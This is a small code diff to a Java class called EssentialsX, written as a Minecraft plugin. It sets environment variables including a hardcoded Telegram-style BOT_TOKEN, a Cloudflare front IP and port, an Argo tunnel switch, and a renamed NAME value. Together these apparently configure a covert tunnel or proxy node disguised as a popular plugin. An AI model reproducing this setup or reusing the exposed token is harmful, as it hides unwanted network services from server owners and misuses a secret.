@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7935239797:AAHuQ9jZt-cNjcgjqQ9HH0JzkSWlD53EttM");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "runoxio");
+        env.put("NAME", "retslavbtpp04");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
